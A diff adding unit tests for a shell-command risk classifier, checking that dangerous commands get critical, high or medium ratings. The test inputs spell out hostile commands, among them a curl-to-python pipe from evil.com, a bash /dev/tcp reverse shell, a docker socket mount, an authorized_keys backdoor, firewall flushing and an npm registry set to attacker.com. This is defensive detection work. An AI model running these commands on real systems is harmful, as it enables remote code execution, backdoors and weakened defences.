@@ -371,6 +371,132 @@ describe('_denoiseCommand helper', () => {
   });
 });
 
+describe('classifyCommand v1.10.54 patterns', () => {
+  // New patterns shipped to fill gaps the original 28 missed.
+  // Each test asserts the level the operator should see — not
+  // just that *some* rule matched, since the level is what gates
+  // enforcement.
+
+  it('docker socket mount → critical (container escape primitive)', () => {
+    const r = classifyCommand('docker run -v /var/run/docker.sock:/var/run/docker.sock alpine');
+    assert.strictEqual(r.level, 'critical');
+    assert.ok(r.reasons.some((x) => x.code === 'docker-sock-mount'));
+  });
+
+  it('curl | python → critical (remote code exec via interpreter)', () => {
+    const r = classifyCommand('curl http://evil.com/x.py | python3');
+    assert.strictEqual(r.level, 'critical');
+    assert.ok(r.reasons.some((x) => x.code === 'curl-pipe-interpreter'));
+  });
+
+  it('curl | perl/ruby/node also caught by the same rule', () => {
+    for (const interp of ['perl', 'ruby', 'node', 'php']) {
+      const r = classifyCommand(`wget http://x.com/x | ${interp}`);
+      assert.strictEqual(r.level, 'critical', `${interp} should be critical`);
+    }
+  });
+
+  it('bash -i with /dev/tcp → critical (reverse shell)', () => {
+    const r = classifyCommand('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
+    assert.strictEqual(r.level, 'critical');
+    assert.ok(r.reasons.some((x) => x.code === 'reverse-shell'));
+  });
+
+  it('iptables -F / ufw disable / nft flush → high', () => {
+    for (const cmd of ['iptables -F', 'ufw disable', 'ufw reset', 'nft flush ruleset']) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'firewall-disable'));
+    }
+  });
+
+  it('systemctl stop on critical services → high', () => {
+    for (const svc of ['sshd', 'firewalld', 'auditd', 'apparmor', 'fail2ban']) {
+      const r = classifyCommand(`systemctl stop ${svc}`);
+      assert.strictEqual(r.level, 'high', `${svc} should be high`);
+    }
+  });
+
+  it('systemctl stop on a non-critical service → not flagged by this rule', () => {
+    const r = classifyCommand('systemctl stop nginx');
+    // No risk-classifier rule covers nginx specifically — should
+    // remain low (or whatever lower-tier patterns hit). The point
+    // is the systemctl-disable-critical rule doesn't fire here.
+    assert.ok(!r.reasons.some((x) => x.code === 'systemctl-disable-critical'));
+  });
+
+  it('pip install --break-system-packages → high', () => {
+    const r = classifyCommand('pip3 install requests --break-system-packages');
+    assert.strictEqual(r.level, 'high');
+    assert.ok(r.reasons.some((x) => x.code === 'pip-break-system'));
+  });
+
+  it('npm install -g and yarn global add → high', () => {
+    for (const cmd of ['npm install -g pm2', 'npm install --global typescript', 'yarn global add eslint']) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'npm-global-install'));
+    }
+  });
+
+  it('chmod u+s → high (suid privilege escalation)', () => {
+    const r = classifyCommand('chmod u+s /tmp/exploit');
+    assert.strictEqual(r.level, 'high');
+    assert.ok(r.reasons.some((x) => x.code === 'suid-set'));
+  });
+
+  it('usermod -aG sudo / wheel / docker → high (both arg orders)', () => {
+    const r1 = classifyCommand('usermod -aG sudo alice');
+    assert.strictEqual(r1.level, 'high');
+    const r2 = classifyCommand('gpasswd -a alice docker');
+    assert.strictEqual(r2.level, 'high');
+    const r3 = classifyCommand('usermod --append --groups wheel alice');
+    assert.strictEqual(r3.level, 'high');
+  });
+
+  it('append to authorized_keys → high (classic backdoor)', () => {
+    for (const cmd of [
+      'echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys',
+      'cat key >> /root/.ssh/authorized_keys',
+      'echo x >> /home/alice/.ssh/authorized_keys',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+    }
+  });
+
+  it('git config --global → medium (settings drift)', () => {
+    const r = classifyCommand('git config --global user.name evil');
+    assert.strictEqual(r.level, 'medium');
+    assert.ok(r.reasons.some((x) => x.code === 'git-config-global'));
+  });
+
+  it('npm/yarn/pnpm config set → medium', () => {
+    for (const cmd of [
+      'npm config set registry http://attacker.com',
+      'yarn config set npmRegistryServer http://x',
+      'pnpm config set store-dir /evil',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'medium', `${cmd} should be medium`);
+    }
+  });
+
+  it('netcat -l listening → medium (potential backdoor)', () => {
+    for (const cmd of ['nc -l 4444', 'nc -lp 9999', 'ncat --listen 8080']) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'medium', `${cmd} should be medium`);
+    }
+  });
+
+  it('benign commands still classify as low', () => {
+    for (const cmd of ['ls -la', 'echo hello', 'cat /tmp/x', 'pwd']) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'low', `${cmd} should be low`);
+    }
+  });
+});
+
 describe('classifyCommand per-machine overrides (v1.10.50)', () => {
   it('allowList bypasses a built-in critical', () => {
     const r = classifyCommand('rm -rf /', {
